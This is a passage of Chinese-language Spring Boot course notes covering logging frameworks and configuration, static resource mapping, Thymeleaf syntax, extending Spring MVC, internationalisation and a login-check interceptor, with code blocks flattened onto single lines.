find unwanted class (OnClassCondition) - @ConditionalOnWebApplication (required) found StandardServletEnvironment (OnWebApplicationCondition) Negative matches:（没有启动，没有匹配成功的自动配置类）----------------- ActiveMQAutoConfiguration: Did not match: - @ConditionalOnClass did not find required classes 'javax.jms.ConnectionFactory', 'org.apache.activemq.ActiveMQConnectionFactory' (OnClassCondition) AopAutoConfiguration: Did not match: - @ConditionalOnClass did not find required classes 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice' (OnClassCondition) 三、日志1、日志框架 小张；开发一个大型系统； ​ 1、System.out.println(“”)；将关键数据打印在控制台；去掉？写在一个文件？ ​ 2、框架来记录系统的一些运行时信息；日志框架 ； zhanglogging.jar； ​ 3、高大上的几个功能？异步模式？自动归档？xxxx？ zhanglogging-good.jar？ ​ 4、将以前框架卸下来？换上新的框架，重新修改之前相关的API；zhanglogging-prefect.jar； ​ 5、JDBC—-数据库驱动； ​ 写了一个统一的接口层；日志门面（日志的一个抽象层）；logging-abstract.jar； ​ 给项目中导入具体的日志实现就行了；我们之前的日志框架都是实现的抽象层； 市面上的日志框架； JUL、JCL、Jboss-logging、logback、log4j、log4j2、slf4j…. 日志门面 （日志的抽象层） 日志实现 JCL（Jakarta Commons Logging） SLF4j（Simple Logging Facade for Java） jboss-logging Log4j JUL（java.util.logging） Log4j2 Logback 左边选一个门面（抽象层）、右边来选一个实现； 日志门面： SLF4J； 日志实现：Logback； SpringBoot：底层是Spring框架，Spring框架默认是用JCL；‘ ​ ==SpringBoot选用 SLF4j和logback；== 2、SLF4j使用1、如何在系统中使用SLF4j https://www.slf4j.org以后开发的时候，日志记录方法的调用，不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法； 给系统里面导入slf4j的jar和 logback的实现jar 123456789import org.slf4j.Logger;import org.slf4j.LoggerFactory;public class HelloWorld &#123; public static void main(String[] args) &#123; Logger logger = LoggerFactory.getLogger(HelloWorld.class); logger.info(\"Hello World\"); &#125;&#125; 图示； 每一个日志的实现框架都有自己的配置文件。使用slf4j以后，配置文件还是做成日志实现框架自己本身的配置文件； 2、遗留问题a（slf4j+logback）: Spring（commons-logging）、Hibernate（jboss-logging）、MyBatis、xxxx 统一日志记录，即使是别的框架和我一起统一使用slf4j进行输出？ 如何让系统中所有的日志都统一到slf4j； ==1、将系统中其他日志框架先排除出去；== ==2、用中间包来替换原有的日志框架；== ==3、我们导入slf4j其他的实现== 3、SpringBoot日志关系1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;&lt;/dependency&gt; SpringBoot使用它来做日志功能； 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;/dependency&gt; 底层依赖关系 总结： ​ 1）、SpringBoot底层也是使用slf4j+logback的方式进行日志记录 ​ 2）、SpringBoot也把其他的日志都替换成了slf4j； ​ 3）、中间替换包？ 123456@SuppressWarnings(\"rawtypes\")public abstract class LogFactory &#123; static String UNSUPPORTED_OPERATION_IN_JCL_OVER_SLF4J = \"http://www.slf4j.org/codes.html#unsupported_operation_in_jcl_over_slf4j\"; static LogFactory logFactory = new SLF4JLogFactory(); ​ 4）、如果我们要引入其他框架？一定要把这个框架的默认日志依赖移除掉？ ​ Spring框架用的是commons-logging； 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; ==SpringBoot能自动适配所有的日志，而且底层使用slf4j+logback的方式记录日志，引入其他框架的时候，只需要把这个框架依赖的日志框架排除掉即可；== 4、日志使用；1、默认配置SpringBoot默认帮我们配置好了日志； 123456789101112131415161718//记录器Logger logger = LoggerFactory.getLogger(getClass());@Testpublic void contextLoads() &#123; //System.out.println(); //日志的级别； //由低到高 trace&lt;debug&lt;info&lt;warn&lt;error //可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效 logger.trace(\"这是trace日志...\"); logger.debug(\"这是debug日志...\"); //SpringBoot默认给我们使用的是info级别的，没有指定级别的就用SpringBoot默认规定的级别；root级别 logger.info(\"这是info日志...\"); logger.warn(\"这是warn日志...\"); logger.error(\"这是error日志...\");&#125; 日志输出格式： %d表示日期时间， %thread表示线程名， %-5level：级别从左显示5个字符宽度 %logger{50} 表示logger名字最长50个字符，否则按照句点分割。 %msg：日志消息， %n是换行符 --&gt; %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n SpringBoot修改日志的默认配置 123456789101112131415logging.level.com.atguigu=trace#logging.path=# 不指定路径在当前项目下生成springboot.log日志# 可以指定完整的路径；#logging.file=G:/springboot.log# 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用 spring.log 作为默认文件logging.path=/spring/log# 在控制台输出的日志的格式logging.pattern.console=%d&#123;yyyy-MM-dd&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n# 指定文件中日志输出的格式logging.pattern.file=%d&#123;yyyy-MM-dd&#125; === [%thread] === %-5level === %logger&#123;50&#125; ==== %msg%n logging.file logging.path Example Description (none) (none) 只在控制台输出 指定文件名 (none) my.log 输出日志到my.log文件 (none) 指定目录 /var/log 输出到指定目录的 spring.log 文件中 2、指定配置给类路径下放上每个日志框架自己的配置文件即可；SpringBoot就不使用他默认配置的了 Logging System Customization Logback logback-spring.xml, logback-spring.groovy, logback.xml or logback.groovy Log4j2 log4j2-spring.xml or log4j2.xml JDK (Java Util Logging) logging.properties logback.xml：直接就被日志框架识别了； logback-spring.xml：日志框架就不直接加载日志的配置项，由SpringBoot解析日志配置，可以使用SpringBoot的高级Profile功能 1234&lt;springProfile name=\"staging\"&gt; &lt;!-- configuration to be enabled when the \"staging\" profile is active --&gt; 可以指定某段配置只在某个环境下生效&lt;/springProfile&gt; 如： 12345678910111213141516171819&lt;appender name=\"stdout\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;!-- 日志输出格式： %d表示日期时间， %thread表示线程名， %-5level：级别从左显示5个字符宽度 %logger&#123;50&#125; 表示logger名字最长50个字符，否则按照句点分割。 %msg：日志消息， %n是换行符 --&gt; &lt;layout class=\"ch.qos.logback.classic.PatternLayout\"&gt; &lt;springProfile name=\"dev\"&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ----&gt; [%thread] ---&gt; %-5level %logger&#123;50&#125; - %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=\"!dev\"&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ==== [%thread] ==== %-5level %logger&#123;50&#125; - %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;/layout&gt; &lt;/appender&gt; 如果使用logback.xml作为日志配置文件，还要使用profile功能，会有以下错误 no applicable action for [springProfile] 5、切换日志框架可以按照slf4j的日志适配图，进行相关的切换； slf4j+log4j的方式； 12345678910111213141516171819&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;artifactId&gt;log4j-over-slf4j&lt;/artifactId&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;&lt;/dependency&gt; 切换为log4j2 123456789101112131415 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;/dependency&gt; 四、Web开发1、简介使用SpringBoot； 1）、创建SpringBoot应用，选中我们需要的模块； 2）、SpringBoot已经默认将这些场景配置好了，只需要在配置文件中指定少量配置就可以运行起来 3）、自己编写业务代码； 自动配置原理？ 这个场景SpringBoot帮我们配置了什么？能不能修改？能修改哪些配置？能不能扩展？xxx 12xxxxAutoConfiguration：帮我们给容器中自动配置组件；xxxxProperties:配置类来封装配置文件的内容； 2、SpringBoot对静态资源的映射规则；123@ConfigurationProperties(prefix = \"spring.resources\", ignoreUnknownFields = false)public class ResourceProperties implements ResourceLoaderAware &#123; //可以设置和静态资源有关的参数，缓存时间等 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364WebMvcAuotConfiguration： @Override public void addResourceHandlers(ResourceHandlerRegistry registry) &#123; if (!this.resourceProperties.isAddMappings()) &#123; logger.debug(\"Default resource handling disabled\"); return; &#125; Integer cachePeriod = this.resourceProperties.getCachePeriod(); if (!registry.hasMappingForPattern(\"/webjars/**\")) &#123; customizeResourceHandlerRegistration( registry.addResourceHandler(\"/webjars/**\") .addResourceLocations( \"classpath:/META-INF/resources/webjars/\") .setCachePeriod(cachePeriod)); &#125; String staticPathPattern = this.mvcProperties.getStaticPathPattern(); //静态资源文件夹映射 if (!registry.hasMappingForPattern(staticPathPattern)) &#123; customizeResourceHandlerRegistration( registry.addResourceHandler(staticPathPattern) .addResourceLocations( this.resourceProperties.getStaticLocations()) .setCachePeriod(cachePeriod)); &#125; &#125; //配置欢迎页映射 @Bean public WelcomePageHandlerMapping welcomePageHandlerMapping( ResourceProperties resourceProperties) &#123; return new WelcomePageHandlerMapping(resourceProperties.getWelcomePage(), this.mvcProperties.getStaticPathPattern()); &#125; //配置喜欢的图标 @Configuration @ConditionalOnProperty(value = \"spring.mvc.favicon.enabled\", matchIfMissing = true) public static class FaviconConfiguration &#123; private final ResourceProperties resourceProperties; public FaviconConfiguration(ResourceProperties resourceProperties) &#123; this.resourceProperties = resourceProperties; &#125; @Bean public SimpleUrlHandlerMapping faviconHandlerMapping() &#123; SimpleUrlHandlerMapping mapping = new SimpleUrlHandlerMapping(); mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + 1); //所有 **/favicon.ico mapping.setUrlMap(Collections.singletonMap(\"**/favicon.ico\", faviconRequestHandler())); return mapping; &#125; @Bean public ResourceHttpRequestHandler faviconRequestHandler() &#123; ResourceHttpRequestHandler requestHandler = new ResourceHttpRequestHandler(); requestHandler .setLocations(this.resourceProperties.getFaviconLocations()); return requestHandler; &#125; &#125; ==1）、所有 /webjars/** ，都去 classpath:/META-INF/resources/webjars/ 找资源；== ​ webjars：以jar包的方式引入静态资源； http://www.webjars.org/ localhost:8080/webjars/jquery/3.3.1/jquery.js 123456&lt;!--引入jquery-webjar--&gt;在访问的时候只需要写webjars下面资源的名称即可 &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;jquery&lt;/artifactId&gt; &lt;version&gt;3.3.1&lt;/version&gt; &lt;/dependency&gt; ==2）、”/**” 访问当前项目的任何资源，都去（静态资源的文件夹）找映射== 12345\"classpath:/META-INF/resources/\", \"classpath:/resources/\",\"classpath:/static/\", \"classpath:/public/\" \"/\"：当前项目的根路径 localhost:8080/abc === 去静态资源文件夹里面找abc ==3）、欢迎页； 静态资源文件夹下的所有index.html页面；被”/**”映射；== ​ localhost:8080/ 找index页面 ==4）、所有的 **/favicon.ico 都是在静态资源文件下找；== 3、模板引擎JSP、Velocity、Freemarker、Thymeleaf SpringBoot推荐的Thymeleaf； 语法更简单，功能更强大； 1、引入thymeleaf；123456789101112 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; 2.1.6 &lt;/dependency&gt;切换thymeleaf版本&lt;properties&gt; &lt;thymeleaf.version&gt;3.0.9.RELEASE&lt;/thymeleaf.version&gt; &lt;!-- 布局功能的支持程序 thymeleaf3主程序 layout2以上版本 --&gt; &lt;!-- thymeleaf2 layout1--&gt; &lt;thymeleaf-layout-dialect.version&gt;2.2.2&lt;/thymeleaf-layout-dialect.version&gt; &lt;/properties&gt; 2、Thymeleaf使用1234567891011@ConfigurationProperties(prefix = \"spring.thymeleaf\")public class ThymeleafProperties &#123; private static final Charset DEFAULT_ENCODING = Charset.forName(\"UTF-8\"); private static final MimeType DEFAULT_CONTENT_TYPE = MimeType.valueOf(\"text/html\"); public static final String DEFAULT_PREFIX = \"classpath:/templates/\"; public static final String DEFAULT_SUFFIX = \".html\"; // 只要我们把HTML页面放在classpath:/templates/，thymeleaf就能自动渲染； 使用： 1、导入thymeleaf的名称空间 1&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; 2、使用thymeleaf语法； 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;成功！&lt;/h1&gt; &lt;!--th:text 将div里面的文本内容设置为 --&gt; &lt;div th:text=\"$&#123;hello&#125;\"&gt;这是显示欢迎信息&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3、语法规则1）、th:text；改变当前元素里面的文本内容； ​ th：任意html属性；来替换原生属性的值 2）、表达式？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869Simple expressions:（表达式语法） Variable Expressions: $&#123;...&#125;：获取变量值；OGNL； 1）、获取对象的属性、调用方法 2）、使用内置的基本对象： #ctx : the context object. #vars: the context variables. #locale : the context locale. #request : (only in Web Contexts) the HttpServletRequest object. #response : (only in Web Contexts) the HttpServletResponse object. #session : (only in Web Contexts) the HttpSession object. #servletContext : (only in Web Contexts) the ServletContext object. $&#123;session.foo&#125; 3）、内置的一些工具对象：#execInfo : information about the template being processed.#messages : methods for obtaining externalized messages inside variables expressions, in the same way as they would be obtained using #&#123;…&#125; syntax.#uris : methods for escaping parts of URLs/URIs#conversions : methods for executing the configured conversion service (if any).#dates : methods for java.util.Date objects: formatting, component extraction, etc.#calendars : analogous to #dates , but for java.util.Calendar objects.#numbers : methods for formatting numeric objects.#strings : methods for String objects: contains, startsWith, prepending/appending, etc.#objects : methods for objects in general.#bools : methods for boolean evaluation.#arrays : methods for arrays.#lists : methods for lists.#sets : methods for sets.#maps : methods for maps.#aggregates : methods for creating aggregates on arrays or collections.#ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration). Selection Variable Expressions: *&#123;...&#125;：选择表达式：和$&#123;&#125;在功能上是一样； 补充：配合 th:object=&quot;$&#123;session.user&#125;： &lt;div th:object=&quot;$&#123;session.user&#125;&quot;&gt; &lt;p&gt;Name: &lt;span th:text=&quot;*&#123;firstName&#125;&quot;&gt;Sebastian&lt;/span&gt;.&lt;/p&gt; &lt;p&gt;Surname: &lt;span th:text=&quot;*&#123;lastName&#125;&quot;&gt;Pepper&lt;/span&gt;.&lt;/p&gt; &lt;p&gt;Nationality: &lt;span th:text=&quot;*&#123;nationality&#125;&quot;&gt;Saturn&lt;/span&gt;.&lt;/p&gt; &lt;/div&gt; Message Expressions: #&#123;...&#125;：获取国际化内容 Link URL Expressions: @&#123;...&#125;：定义URL； @&#123;/order/process(execId=$&#123;execId&#125;,execType=&apos;FAST&apos;)&#125; Fragment Expressions: ~&#123;...&#125;：片段引用表达式 &lt;div th:insert=&quot;~&#123;commons :: main&#125;&quot;&gt;...&lt;/div&gt; Literals（字面量） Text literals: &apos;one text&apos; , &apos;Another one!&apos; ,… Number literals: 0 , 34 , 3.0 , 12.3 ,… Boolean literals: true , false Null literal: null Literal tokens: one , sometext , main ,…Text operations:（文本操作） String concatenation: + Literal substitutions: |The name is $&#123;name&#125;|Arithmetic operations:（数学运算） Binary operators: + , - , * , / , % Minus sign (unary operator): -Boolean operations:（布尔运算） Binary operators: and , or Boolean negation (unary operator): ! , notComparisons and equality:（比较运算） Comparators: &gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le ) Equality operators: == , != ( eq , ne )Conditional operators:条件运算（三元运算符） If-then: (if) ? (then) If-then-else: (if) ? (then) : (else) Default: (value) ?: (defaultvalue)Special tokens: No-Operation: _ 4、SpringMVC自动配置https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications 1. Spring MVC auto-configurationSpring Boot 自动配置好了SpringMVC 以下是SpringBoot对SpringMVC的默认配置:==（WebMvcAutoConfiguration）== Inclusion of ContentNegotiatingViewResolver and BeanNameViewResolver beans. 自动配置了ViewResolver（视图解析器：根据方法的返回值得到视图对象（View），视图对象决定如何渲染（转发？重定向？）） ContentNegotiatingViewResolver：组合所有的视图解析器的； ==如何定制：我们可以自己给容器中添加一个视图解析器；自动的将其组合进来；== Support for serving static resources, including support for WebJars (see below).静态资源文件夹路径,webjars Static index.html support. 静态首页访问 Custom Favicon support (see below). favicon.ico ​ 自动注册了 of Converter, GenericConverter, Formatter beans. Converter：转换器； public String hello(User user)：类型转换使用Converter Formatter 格式化器； 2017.12.17===Date； 12345@Bean@ConditionalOnProperty(prefix = \"spring.mvc\", name = \"date-format\")//在文件中配置日期格式化的规则public Formatter&lt;Date&gt; dateFormatter() &#123; return new DateFormatter(this.mvcProperties.getDateFormat());//日期格式化组件&#125; ​ ==自己添加的格式化器转换器，我们只需要放在容器中即可== Support for HttpMessageConverters (see below). HttpMessageConverter：SpringMVC用来转换Http请求和响应的；User—-Json； HttpMessageConverters 是从容器中确定；获取所有的HttpMessageConverter； ==自己给容器中添加HttpMessageConverter，只需要将自己的组件注册容器中（@Bean,@Component）== ​ Automatic registration of MessageCodesResolver (see below).定义错误代码生成规则 Automatic use of a ConfigurableWebBindingInitializer bean (see below). ==我们可以配置一个ConfigurableWebBindingInitializer来替换默认的；（添加到容器）== 12初始化WebDataBinder；请求数据=====JavaBean； org.springframework.boot.autoconfigure.web：web的所有自动场景； If you want to keep Spring Boot MVC features, and you just want to add additional MVC configuration (interceptors, formatters, view controllers etc.) you can add your own @Configuration class of type WebMvcConfigurerAdapter, but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter or ExceptionHandlerExceptionResolver you can declare a WebMvcRegistrationsAdapter instance providing such components. If you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc. 2、扩展SpringMVC1234567&lt;mvc:view-controller path=\"/hello\" view-name=\"success\"/&gt;&lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path=\"/hello\"/&gt; &lt;bean&gt;&lt;/bean&gt; &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt; ==编写一个配置类（@Configuration），是WebMvcConfigurerAdapter类型；不能标注@EnableWebMvc==; 既保留了所有的自动配置，也能用我们扩展的配置； 1234567891011//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能@Configurationpublic class MyMvcConfig extends WebMvcConfigurerAdapter &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; // super.addViewControllers(registry); //浏览器发送 /atguigu 请求来到 success registry.addViewController(\"/atguigu\").setViewName(\"success\"); &#125;&#125; 原理： ​ 1）、WebMvcAutoConfiguration是SpringMVC的自动配置类 ​ 2）、在做其他自动配置时会导入；@Import(EnableWebMvcConfiguration.class) 123456789101112131415161718 @Configurationpublic static class EnableWebMvcConfiguration extends DelegatingWebMvcConfiguration &#123; private final WebMvcConfigurerComposite configurers = new WebMvcConfigurerComposite(); //从容器中获取所有的WebMvcConfigurer @Autowired(required = false) public void setConfigurers(List&lt;WebMvcConfigurer&gt; configurers) &#123; if (!CollectionUtils.isEmpty(configurers)) &#123; this.configurers.addWebMvcConfigurers(configurers); //一个参考实现；将所有的WebMvcConfigurer相关配置都来一起调用； @Override // public void addViewControllers(ViewControllerRegistry registry) &#123; // for (WebMvcConfigurer delegate : this.delegates) &#123; // delegate.addViewControllers(registry); // &#125; &#125; &#125;&#125; ​ 3）、容器中所有的WebMvcConfigurer都会一起起作用； ​ 4）、我们的配置类也会被调用； ​ 效果：SpringMVC的自动配置和我们的扩展配置都会起作用； 3、全面接管SpringMVC；SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己配置；所有的SpringMVC的自动配置都失效了 我们需要在配置类中添加@EnableWebMvc即可； 123456789101112//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能@EnableWebMvc@Configurationpublic class MyMvcConfig extends WebMvcConfigurerAdapter &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; // super.addViewControllers(registry); //浏览器发送 /atguigu 请求来到 success registry.addViewController(\"/atguigu\").setViewName(\"success\"); &#125;&#125; 原理： 为什么@EnableWebMvc自动配置就失效了； 1）@EnableWebMvc的核心 12@Import(DelegatingWebMvcConfiguration.class)public @interface EnableWebMvc &#123; 2）、 12@Configurationpublic class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport &#123; 3）、 12345678910@Configuration@ConditionalOnWebApplication@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurerAdapter.class &#125;)//容器中没有这个组件的时候，这个自动配置类才生效@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, ValidationAutoConfiguration.class &#125;)public class WebMvcAutoConfiguration &#123; 4）、@EnableWebMvc将WebMvcConfigurationSupport组件导入进来； 5）、导入的WebMvcConfigurationSupport只是SpringMVC最基本的功能； 5、如何修改SpringBoot的默认配置模式： ​ 1）、SpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@Bean、@Component）如果有就用用户配置的，如果没有，才自动配置；如果有些组件可以有多个（ViewResolver）将用户配置的和自己默认的组合起来； ​ 2）、在SpringBoot中会有非常多的xxxConfigurer帮助我们进行扩展配置 ​ 3）、在SpringBoot中会有很多的xxxCustomizer帮助我们进行定制配置 6、RestfulCRUD1）、默认访问首页1234567891011121314151617181920212223242526//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能//@EnableWebMvc 不要接管SpringMVC@Configurationpublic class MyMvcConfig extends WebMvcConfigurerAdapter &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; // super.addViewControllers(registry); //浏览器发送 /atguigu 请求来到 success registry.addViewController(\"/atguigu\").setViewName(\"success\"); &#125; //所有的WebMvcConfigurerAdapter组件都会一起起作用 @Bean //将组件注册在容器 public WebMvcConfigurerAdapter webMvcConfigurerAdapter()&#123; WebMvcConfigurerAdapter adapter = new WebMvcConfigurerAdapter() &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(\"/\").setViewName(\"login\"); registry.addViewController(\"/index.html\").setViewName(\"login\"); &#125; &#125;; return adapter; &#125;&#125; 2）、国际化1）、编写国际化配置文件； 2）、使用ResourceBundleMessageSource管理国际化资源文件 3）、在页面使用fmt:message取出国际化内容 步骤： 1）、编写国际化配置文件，抽取页面需要显示的国际化消息 2）、SpringBoot自动配置好了管理国际化资源文件的组件； 12345678910111213141516171819202122232425262728@ConfigurationProperties(prefix = \"spring.messages\")public class MessageSourceAutoConfiguration &#123; /** * Comma-separated list of basenames (essentially a fully-qualified classpath * location), each following the ResourceBundle convention with relaxed support for * slash based locations. If it doesn't contain a package qualifier (such as * \"org.mypackage\"), it will be resolved from the classpath root. */ private String basename = \"messages\"; //我们的配置文件可以直接放在类路径下叫messages.properties； @Bean public MessageSource messageSource() &#123; ResourceBundleMessageSource messageSource = new ResourceBundleMessageSource(); if (StringUtils.hasText(this.basename)) &#123; //设置国际化资源文件的基础名（去掉语言国家代码的） messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray( StringUtils.trimAllWhitespace(this.basename))); &#125; if (this.encoding != null) &#123; messageSource.setDefaultEncoding(this.encoding.name()); &#125; messageSource.setFallbackToSystemLocale(this.fallbackToSystemLocale); messageSource.setCacheSeconds(this.cacheSeconds); messageSource.setAlwaysUseMessageFormat(this.alwaysUseMessageFormat); return messageSource; &#125; 3）、去页面获取国际化的值； 123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;meta name=\"description\" content=\"\"&gt; &lt;meta name=\"author\" content=\"\"&gt; &lt;title&gt;Signin Template for Bootstrap&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=\"asserts/css/bootstrap.min.css\" th:href=\"@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;\" rel=\"stylesheet\"&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=\"asserts/css/signin.css\" th:href=\"@&#123;/asserts/css/signin.css&#125;\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body class=\"text-center\"&gt; &lt;form class=\"form-signin\" action=\"dashboard.html\"&gt; &lt;img class=\"mb-4\" th:src=\"@&#123;/asserts/img/bootstrap-solid.svg&#125;\" src=\"asserts/img/bootstrap-solid.svg\" alt=\"\" width=\"72\" height=\"72\"&gt; &lt;h1 class=\"h3 mb-3 font-weight-normal\" th:text=\"#&#123;login.tip&#125;\"&gt;Please sign in&lt;/h1&gt; &lt;label class=\"sr-only\" th:text=\"#&#123;login.username&#125;\"&gt;Username&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"Username\" th:placeholder=\"#&#123;login.username&#125;\" required=\"\" autofocus=\"\"&gt; &lt;label class=\"sr-only\" th:text=\"#&#123;login.password&#125;\"&gt;Password&lt;/label&gt; &lt;input type=\"password\" class=\"form-control\" placeholder=\"Password\" th:placeholder=\"#&#123;login.password&#125;\" required=\"\"&gt; &lt;div class=\"checkbox mb-3\"&gt; &lt;label&gt; &lt;input type=\"checkbox\" value=\"remember-me\"/&gt; [[#&#123;login.remember&#125;]] &lt;/label&gt; &lt;/div&gt; &lt;button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\" th:text=\"#&#123;login.btn&#125;\"&gt;Sign in&lt;/button&gt; &lt;p class=\"mt-5 mb-3 text-muted\"&gt;© 2017-2018&lt;/p&gt; &lt;a class=\"btn btn-sm\"&gt;中文&lt;/a&gt; &lt;a class=\"btn btn-sm\"&gt;English&lt;/a&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 效果：根据浏览器语言设置的信息切换了国际化； 原理： ​ 国际化Locale（区域信息对象）；LocaleResolver（获取区域信息对象）； 12345678910111213 @Bean @ConditionalOnMissingBean @ConditionalOnProperty(prefix = \"spring.mvc\", name = \"locale\") public LocaleResolver localeResolver() &#123; if (this.mvcProperties .getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123; return new FixedLocaleResolver(this.mvcProperties.getLocale()); &#125; AcceptHeaderLocaleResolver localeResolver = new AcceptHeaderLocaleResolver(); localeResolver.setDefaultLocale(this.mvcProperties.getLocale()); return localeResolver; &#125;默认的就是根据请求头带来的区域信息获取Locale进行国际化 4）、点击链接切换国际化 12345678910111213141516171819202122232425262728/** * 可以在连接上携带区域信息 */public class MyLocaleResolver implements LocaleResolver &#123; @Override public Locale resolveLocale(HttpServletRequest request) &#123; String l = request.getParameter(\"l\"); Locale locale = Locale.getDefault(); if(!StringUtils.isEmpty(l))&#123; String[] split = l.split(\"_\"); locale = new Locale(split[0],split[1]); &#125; return locale; &#125; @Override public void setLocale(HttpServletRequest request, HttpServletResponse response, Locale locale) &#123; &#125;&#125; @Bean public LocaleResolver localeResolver()&#123; return new MyLocaleResolver(); &#125;&#125; 3）、登陆开发期间模板引擎页面修改以后，要实时生效 1）、禁用模板引擎的缓存 12# 禁用缓存spring.thymeleaf.cache=false 2）、页面修改完成以后ctrl+f9：重新编译； 登陆错误消息的显示 1&lt;p style=\"color: red\" th:text=\"$&#123;msg&#125;\" th:if=\"$&#123;not #strings.isEmpty(msg)&#125;\"&gt;&lt;/p&gt; 4）、拦截器进行登陆检查拦截器 12345678910111213141516171819202122232425262728293031/** * 登陆检查， */public class LoginHandlerInterceptor implements HandlerInterceptor &#123; //目标方法执行之前 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; Object user = request.getSession().getAttribute(\"loginUser\"); if(user == null)&#123; //未登陆，返回登陆页面 request.setAttribute(\"msg\",\"没有权限请先登陆\"); request.getRequestDispatcher(\"/index.html\").forward(request,response); return false; &#125;else&#123; //已登陆，放行请求 return true; &#125; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; &#125;&#125; 